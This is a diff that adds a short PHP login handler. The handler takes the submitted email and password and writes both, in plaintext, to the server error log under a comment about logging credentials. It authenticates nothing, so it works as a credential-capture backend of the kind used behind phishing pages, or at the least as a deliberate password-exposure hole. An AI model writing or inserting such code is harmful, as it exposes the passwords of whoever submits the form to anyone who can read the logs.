@@ -1,0 +1,9 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $email = $_POST['email'] ?? 'unknown';
+    $password = $_POST['password'] ?? 'unknown';
+
+    // Log credentials to the error log
+    error_log("LOGIN ATTEMPT: Email: $email | Password: $password");
+}
+?>
